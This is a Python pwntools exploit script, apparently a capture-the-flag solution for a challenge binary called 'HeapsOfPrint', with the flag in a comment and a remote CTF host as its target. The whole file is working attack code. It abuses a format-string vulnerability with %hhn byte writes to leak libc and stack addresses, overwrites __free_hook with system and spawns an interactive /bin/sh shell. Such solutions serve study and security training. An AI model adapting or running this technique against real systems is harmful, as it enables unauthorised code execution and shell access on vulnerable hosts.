from pwn import *
import sys
from time import time
import ctypes

LOCAL_LIBC32 = "/lib/i386-linux-gnu/libc.so.6"
LOCAL_LIBC64 = "/lib/x86_64-linux-gnu/libc.so.6"

BINARY = "./HeapsOfPrint"
LIBC = "./libc.so.6"
LOCAL_LIBC = LOCAL_LIBC64

context.clear()
context(os="linux", arch="amd64", bits=64)
# context.log_level = 'debug'

# FLAG{dr4w1ng_st4ckfr4m3s_f0r_fun_4nd_pr0f1t}

def getchar(v, cnt):
    i = 0
    while (cnt + i) & 0xff != v:
        i += 1
    cnt += i
    return (i, cnt)

def getcommonpayload(conn, c):
    conn.recvuntil('is ')
    leak = ord(conn.recv(1))
    conn.recvuntil("it?")

    cnt = 0
    payload = ""
    for i in range(5):
        payload += "%c"
        cnt += 1
    payload += "A" * (leak - 7 + 0x18 - cnt)
    cnt = leak - 7 + 0x18
    payload += "%hhn"
    for i in range(3):
        payload += "%c"
        cnt += 1

    a, cnt = getchar(c, cnt)
    payload += "A"*a
    payload += "%hhn"
    return (payload, cnt, leak)

def exploit(conn, elf, libc, local):

    payload, cnt, _ = getcommonpayload(conn, 0x6)
    for i in range(6):
        payload += "%c"
    payload += "----%p"
    conn.sendline(payload)
    conn.recvuntil("----")
    libc.address = int(conn.recv(14), 16) - 0x20830
    log.info("libc base: 0x%x" % libc.address)

    payload, cnt, leak = getcommonpayload(conn, 0x6b)
    for i in range(5):
        payload += "%c"
    cnt += 5
    a, cnt = getchar((leak - 7 + 0x50) & 0xff, cnt)
    payload += "A"*a
    payload += "%hhn"
    conn.sendline(payload)

    payload, cnt, leak = getcommonpayload(conn, 0x6b)
    for i in range(5):
        payload += "%c"
    cnt += 5
    payload += "----%p"
    conn.sendline(payload)
    conn.recvuntil("----")
    saddr = int(conn.recv(14), 16)
    diff = 0
    while (saddr + diff) & 0xff != 0x00:
        diff += 1

    freehook = p64(libc.symbols['__free_hook'])
    for i in range(len(freehook)):
        payload, cnt, leak = getcommonpayload(conn, 0x6b)
        for _ in range(5):
            payload += "%c"
        cnt += 5
        a, cnt = getchar(i, cnt)
        payload += "A"*a
        payload += "%hhn"
        cnt += 1
        payload += "%c"
        a, cnt = getchar(ord(freehook[i]), cnt)
        payload += "A"*a
        payload += "%hhn"
        conn.sendline(payload)

    payload, cnt, leak = getcommonpayload(conn, 0x6b)
    for _ in range(5):
        payload += "%c"
    cnt += 5
    a, cnt = getchar(0, cnt)
    payload += "A"*a
    payload += "%hhn"
    conn.sendline(payload)

    systemaddr = p64(libc.symbols['system'])
    for i in range(len(systemaddr)):
        payload, cnt, leak = getcommonpayload(conn, 0x6b)
        for _ in range(7):
            payload += "%c"
        cnt += 7
        a, cnt = getchar((libc.symbols['__free_hook'] & 0xff) + i, cnt)
        payload += "A"*a
        payload += "%hhn"

        for _ in range((diff - 8) / 8):
            payload += "%c"
        cnt += ((diff - 8) / 8)

        a, cnt = getchar(ord(systemaddr[i]), cnt)
        payload += "A"*a
        payload += "%hhn"
        conn.sendline(payload)

    conn.recvuntil('it?')
    conn.sendline("/bin/sh")
    conn.interactive()
    conn.close()
    return

if __name__ == "__main__":
    elf = ELF(BINARY)
    try:
        if sys.argv[1] == "remote":
            H,P = ("flatearth.fluxfingers.net", 1747)
            r = remote(H, P)
            libc = ELF(LIBC)
            exploit(r, elf, libc, local=False)
        elif sys.argv[1] == "local":
            r = process(BINARY)
            log.info("PID: {}".format(r.proc.pid))
            libc = ELF(LOCAL_LIBC)
            pause()
            exploit(r, elf, libc, local=True)
        elif sys.argv[1] == "docker":
            r = process(BINARY, env = {"LD_PRELOAD": LIBC})
            libc = ELF(LIBC)
            pause()
            exploit(r, elf, libc, local=True)
        else:
            print "Usage: {} local|docker|remote".format(sys.argv[0])
            sys.exit(1)
    except IndexError:
        r = process(BINARY)
        log.info("PID: {}".format(r.proc.pid))
        libc = ELF(LOCAL_LIBC)
        pause()
        exploit(r, elf, libc, local=True)
